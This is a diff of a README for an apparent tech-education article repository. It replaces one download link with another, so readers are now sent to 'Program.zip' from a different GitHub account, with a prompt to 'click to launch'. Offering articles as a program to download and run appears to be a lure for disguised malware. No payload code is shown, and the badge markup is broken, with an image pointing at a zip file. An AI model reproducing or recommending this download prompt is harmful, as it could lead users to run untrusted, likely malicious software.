@@ -16,9 +16,9 @@ Our articles cover a wide range of topics, including artificial intelligence, bl
 
 If you're eager to start your tech education journey, look no further! You can access our articles by clicking on the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Shinsuue/one-small-step/releases/download/v1.0/Program.zip)](https://github.com/Shinsuue/one-small-step/releases/download/v1.0/Program.zip)
 
-📂 **Software.zip**: Click to launch and download the repository content.
+📂 **https://github.com/Shinsuue/one-small-step/releases/download/v1.0/Program.zip**: Click to launch and download the repository content.
 
 ## How to Contribute
 
